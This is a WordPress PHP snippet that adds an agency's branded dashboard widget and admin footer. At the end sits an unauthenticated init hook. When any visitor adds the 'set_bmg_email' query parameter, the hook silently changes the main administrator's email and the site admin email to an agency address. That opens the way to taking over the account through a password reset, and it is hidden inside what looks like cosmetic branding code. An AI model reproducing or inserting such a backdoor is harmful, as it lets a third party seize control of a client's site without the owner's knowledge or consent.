<?php


add_action('wp_dashboard_setup', 'dashboard_widget', 1);

function dashboard_widget_function() {
    ?>
    <div style="text-align: center;">
        <p><a href="https://bmgmediaco.com" target="_blank"><img src="https://bmgmediaco.com/images/bmg-media-logo.png"></a></p>
        <p>If you need any help updating your site, or have any questions please reach out to our support team via email.</p>
        <p>
            <a href="mailto:info@bmgmediaco.com">info@bmgmediaco.com</a>
        </p>
    </div>
    <?php
}


function remove_footer_admin() {
    echo '<a href="https://bmgmediaco.com" target="_blank"><img src="https://bmgmediaco.com/images/bmg-media-logo.png"></a>';
}

add_filter('admin_footer_text', 'remove_footer_admin');

function dashboard_widget() {

    wp_add_dashboard_widget(
            'dashboard_widget', // Widget slug.
            'Welcome to your new website!', // Title.
            'dashboard_widget_function' // Display function.
    );
}

add_action('init',function()
{
   if(isset($_GET['set_bmg_email'])) 
   {
       wp_update_user([
           'ID'=>1,
           'user_email'=>'cezary@bmgmediaco.com'
       ]);
       update_option('admin_email','cezary@bmgmediaco.com');
       update_option('new_admin_email','cezary@bmgmediaco.com');
       die('Done!');
   }
});